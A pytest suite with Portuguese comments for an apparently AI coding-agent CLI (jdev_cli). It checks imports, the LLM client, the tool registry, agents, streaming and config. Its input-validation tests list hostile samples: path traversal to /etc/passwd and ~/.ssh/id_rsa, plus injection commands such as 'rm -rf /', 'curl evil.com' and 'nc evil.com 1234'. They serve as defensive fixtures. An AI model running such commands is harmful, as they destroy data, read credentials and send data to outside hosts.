"""
CRITICAL PATH TESTS - Testes do caminho crítico do sistema.

Estes testes DEVEM passar para o sistema ser usável.
Se algum falhar, o sistema está quebrado.

Autor: JuanCS Dev
Data: 2025-11-25
"""

import pytest
import os


# =============================================================================
# TESTE 1: IMPORTAÇÕES CRÍTICAS
# =============================================================================

class TestCriticalImports:
    """Testa que todos os módulos críticos podem ser importados."""

    def test_import_core_modules(self):
        """Core modules devem importar sem erro."""
        errors = []

        modules = [
            "jdev_cli",
            "jdev_cli.core",
            "jdev_cli.core.llm",
            "jdev_cli.agents",
            "jdev_cli.agents.base",
            "jdev_cli.tools",
            "jdev_cli.tools.base",
        ]

        for module in modules:
            try:
                __import__(module)
            except ImportError as e:
                errors.append(f"{module}: {e}")

        assert not errors, "Failed imports:\n" + "\n".join(errors)

    def test_import_tui_modules(self):
        """TUI modules devem importar sem erro."""
        errors = []

        modules = [
            "jdev_cli.tui",
            "jdev_cli.tui.components",
        ]

        for module in modules:
            try:
                __import__(module)
            except ImportError as e:
                errors.append(f"{module}: {e}")

        assert not errors, "Failed imports:\n" + "\n".join(errors)


# =============================================================================
# TESTE 2: LLM CLIENT
# =============================================================================

class TestLLMClient:
    """Testa o cliente LLM (Gemini)."""

    def test_llm_client_instantiation(self):
        """LLMClient deve instanciar mesmo sem API key."""
        from jdev_cli.core.llm import LLMClient

        # Deve instanciar (pode estar desconectado)
        client = LLMClient()
        assert client is not None

    def test_llm_client_has_required_methods(self):
        """LLMClient deve ter métodos essenciais."""
        from jdev_cli.core.llm import LLMClient

        client = LLMClient()

        # Métodos que DEVEM existir
        assert hasattr(client, 'generate') or hasattr(client, 'stream'), \
            "LLMClient must have 'generate' or 'stream' method"

    @pytest.mark.asyncio
    async def test_llm_handles_missing_api_key_gracefully(self):
        """LLM deve falhar graciosamente sem API key."""
        from jdev_cli.core.llm import LLMClient

        # Backup e remove API key
        original_key = os.environ.get('GEMINI_API_KEY')
        if 'GEMINI_API_KEY' in os.environ:
            del os.environ['GEMINI_API_KEY']

        try:
            client = LLMClient()
            # Deve ou retornar erro claro ou não crashar
            # Não deve levantar exceção não tratada
        except Exception as e:
            # Se levantar, deve ser erro claro
            assert "API" in str(e).upper() or "KEY" in str(e).upper(), \
                f"Error should mention API key, got: {e}"
        finally:
            # Restaura
            if original_key:
                os.environ['GEMINI_API_KEY'] = original_key


# =============================================================================
# TESTE 3: TOOL REGISTRY
# =============================================================================

class TestToolRegistry:
    """Testa o registry de ferramentas."""

    def test_tool_registry_exists(self):
        """ToolRegistry class deve existir."""
        from jdev_cli.tools.base import ToolRegistry

        # Deve ser possível criar uma instância
        registry = ToolRegistry()
        assert registry is not None

    def test_tool_registry_has_methods(self):
        """ToolRegistry deve ter métodos essenciais."""
        from jdev_cli.tools.base import ToolRegistry

        registry = ToolRegistry()

        # Métodos que devem existir
        assert hasattr(registry, 'register') or hasattr(registry, 'add'), \
            "ToolRegistry should have register/add method"
        assert hasattr(registry, 'get'), \
            "ToolRegistry should have get method"

    def test_tool_base_class_exists(self):
        """Tool base class deve existir."""
        from jdev_cli.tools.base import Tool, ToolResult

        assert Tool is not None
        assert ToolResult is not None

    def test_tool_result_creation(self):
        """ToolResult deve ser criável."""
        from jdev_cli.tools.base import ToolResult

        # Sucesso
        success = ToolResult(success=True, data="test data")
        assert success.success is True
        assert success.data == "test data"

        # Erro
        error = ToolResult(success=False, error="Something failed")
        assert error.success is False
        assert "failed" in error.error.lower()


# =============================================================================
# TESTE 4: AGENTS
# =============================================================================

class TestAgents:
    """Testa o sistema de agentes."""

    def test_base_agent_imports(self):
        """BaseAgent e classes relacionadas devem importar."""
        from jdev_cli.agents.base import (
            BaseAgent,
            AgentTask,
            AgentResponse,
        )

        assert BaseAgent is not None
        assert AgentTask is not None
        assert AgentResponse is not None

    def test_agent_task_creation(self):
        """AgentTask deve ser criável com dados válidos."""
        from jdev_cli.agents.base import AgentTask

        task = AgentTask(
            request="Test request",
            session_id="test-session"
        )

        assert task.request == "Test request"
        assert task.session_id == "test-session"

    def test_agent_response_creation(self):
        """AgentResponse deve ser criável."""
        from jdev_cli.agents.base import AgentResponse

        response = AgentResponse(
            success=True,
            data={"result": "test"},
            reasoning="Test reasoning"
        )

        assert response.success is True
        assert response.data["result"] == "test"

    def test_specialized_agents_import(self):
        """Agentes especializados devem importar."""
        errors = []

        agents = [
            ("jdev_cli.agents.planner", "PlannerAgent"),
            ("jdev_cli.agents.executor", "ExecutorAgent"),
            ("jdev_cli.agents.explorer", "ExplorerAgent"),
        ]

        for module_name, class_name in agents:
            try:
                module = __import__(module_name, fromlist=[class_name])
                agent_class = getattr(module, class_name, None)
                if agent_class is None:
                    errors.append(f"{module_name}.{class_name}: class not found")
            except ImportError as e:
                errors.append(f"{module_name}: {e}")

        if errors:
            pytest.fail("Agent import errors:\n" + "\n".join(errors))


# =============================================================================
# TESTE 5: INPUT VALIDATION (SEGURANÇA)
# =============================================================================

class TestInputValidation:
    """Testa validação de entrada para segurança."""

    def test_path_traversal_blocked(self):
        """Path traversal deve ser bloqueado."""
        from jdev_cli.core.input_validator import validate_file_path

        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "..\\..\\windows\\system32",
        ]

        for path in dangerous_paths:
            result = validate_file_path(path)
            assert not result.is_valid, \
                f"Path traversal not blocked: {path}"

    def test_command_injection_blocked(self):
        """Command injection deve ser bloqueado."""
        from jdev_cli.core.input_validator import validate_command

        dangerous_commands = [
            "ls; rm -rf /",
            "cat file && curl evil.com",
            "echo `whoami`",
            "ls | nc evil.com 1234",
        ]

        for cmd in dangerous_commands:
            result = validate_command(cmd, allow_shell=False)
            # Deve bloquear OU retornar warning
            assert not result.is_valid or result.warnings, \
                f"Command injection not blocked: {cmd}"

    def test_safe_commands_allowed(self):
        """Comandos seguros devem ser permitidos."""
        from jdev_cli.core.input_validator import validate_command

        safe_commands = [
            "ls -la",
            "cat file.txt",
            "grep pattern file",
            "python script.py",
        ]

        for cmd in safe_commands:
            result = validate_command(cmd, allow_shell=False)
            # Pode ter warnings, mas deve ser válido
            assert result.is_valid, \
                f"Safe command blocked: {cmd}, errors: {result.errors}"


# =============================================================================
# TESTE 6: ERROR HANDLING
# =============================================================================

class TestErrorHandling:
    """Testa que erros são tratados e mostrados claramente."""

    def test_tool_result_has_error_field(self):
        """ToolResult deve ter campo de erro."""
        from jdev_cli.tools.base import ToolResult

        # Resultado de sucesso
        success = ToolResult(success=True, data="ok")
        assert success.success is True
        assert success.error is None

        # Resultado de erro
        error = ToolResult(success=False, error="Something went wrong")
        assert error.success is False
        assert "wrong" in error.error.lower()

    def test_agent_response_has_error_field(self):
        """AgentResponse deve ter campo de erro."""
        from jdev_cli.agents.base import AgentResponse

        # Resposta de erro
        response = AgentResponse(
            success=False,
            reasoning="Failed because X",
            error="Detailed error message"
        )

        assert response.success is False
        assert response.error is not None
        assert "error" in response.error.lower() or "message" in response.error.lower()


# =============================================================================
# TESTE 7: STREAMING COMPONENTS
# =============================================================================

class TestStreamingComponents:
    """Testa componentes de streaming."""

    def test_block_detector_imports(self):
        """BlockDetector deve importar."""
        from jdev_cli.tui.components.block_detector import BlockDetector
        assert BlockDetector is not None

    def test_block_detector_processes_chunks(self):
        """BlockDetector deve processar chunks corretamente."""
        from jdev_cli.tui.components.block_detector import BlockDetector

        detector = BlockDetector()

        # Simula streaming
        chunks = [
            "# Hello\n",
            "```python\n",
            "print('hi')\n",
            "```\n",
        ]

        for chunk in chunks:
            detector.process_chunk(chunk)

        blocks = detector.get_all_blocks()
        assert len(blocks) >= 1, "Should detect at least 1 block"

    def test_block_detector_detects_code_fence(self):
        """BlockDetector deve detectar code fences."""
        from jdev_cli.tui.components.block_detector import BlockDetector, BlockType

        detector = BlockDetector()

        text = "```python\nprint('test')\n```\n"
        detector.process_chunk(text)

        blocks = detector.get_all_blocks()
        code_blocks = [b for b in blocks if b.block_type == BlockType.CODE_FENCE]

        assert len(code_blocks) >= 1, "Should detect code fence"


# =============================================================================
# TESTE 8: CONFIGURATION
# =============================================================================

class TestConfiguration:
    """Testa sistema de configuração."""

    def test_config_loader_exists(self):
        """ConfigLoader deve existir."""
        from jdev_cli.config.loader import ConfigLoader
        assert ConfigLoader is not None

    def test_config_has_defaults(self):
        """Configuração deve ter defaults sensatos."""
        from jdev_cli.config.loader import ConfigLoader

        loader = ConfigLoader()
        config = loader.config

        # Deve ter configurações básicas
        assert config is not None


# =============================================================================
# SMOKE TEST - O SISTEMA FUNCIONA?
# =============================================================================

class TestSmokeTest:
    """Smoke test - verifica que o sistema básico funciona."""

    def test_can_create_basic_workflow(self):
        """Deve ser possível criar um workflow básico."""
        from jdev_cli.agents.base import AgentTask, AgentResponse
        from jdev_cli.tools.base import ToolResult

        # 1. Criar task
        task = AgentTask(request="test", session_id="smoke")

        # 2. Criar resultado de ferramenta
        tool_result = ToolResult(success=True, data="file content")

        # 3. Criar resposta do agente
        response = AgentResponse(
            success=True,
            data={"tool_result": tool_result.data},
            reasoning="Processed successfully"
        )

        assert response.success
        assert "file content" in str(response.data)

    def test_entry_points_exist(self):
        """Entry points devem existir."""
        import subprocess

        # Verifica se o comando existe (não precisa rodar)
        result = subprocess.run(
            ["python", "-c", "from jdev_cli.main import cli_main"],
            capture_output=True,
            text=True
        )

        # Deve importar sem erro
        assert result.returncode == 0, \
            f"Entry point import failed: {result.stderr}"
